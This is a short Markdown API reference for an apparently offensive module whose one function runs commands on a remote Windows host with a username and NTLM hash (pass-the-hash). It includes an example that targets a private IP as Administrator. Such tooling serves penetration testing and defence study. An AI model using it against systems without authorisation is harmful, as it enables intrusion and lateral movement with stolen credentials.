
---

**File**: `Pass_the_Hash_API.md`

```markdown
# Pass the Hash Module API Documentation

## Functions
### `pass_the_hash(target_ip, username, ntlm_hash, command)`
- **Description**: Executes a command on a remote system using NTLM hashes.
- **Parameters**:
  - `target_ip`: The IP address of the target system.
  - `username`: The username for authentication.
  - `ntlm_hash`: The NTLM hash for authentication.
  - `command`: The command to execute.
- **Returns**: A string indicating success or failure.

## Example Usage
```python
from pass_the_hash import pass_the_hash

# Execute a command on a remote system
result = pass_the_hash("192.168.1.10", "Administrator", "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "whoami")
print(result)